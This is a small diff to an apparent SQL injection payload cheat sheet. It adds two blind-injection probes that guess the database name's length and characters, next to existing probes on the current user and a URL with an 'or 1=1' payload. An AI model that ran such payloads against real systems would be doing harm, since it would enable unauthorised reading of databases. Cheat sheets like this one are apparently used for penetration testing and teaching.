@@ -90,6 +90,8 @@ www.example.com/xxx.php?id=1 or 1=1
 ```
 ' OR LEN(CURRENT_USER)='3
 ' OR SUBSTRING(CURRENT_USER,1,3)='DBO
+' OR LEN(db_name())=13;--
+' OR SUBSTRING(db_name(),1,5)='xxxxx';--
 ```
 
 ## NodeJS / MongoDB
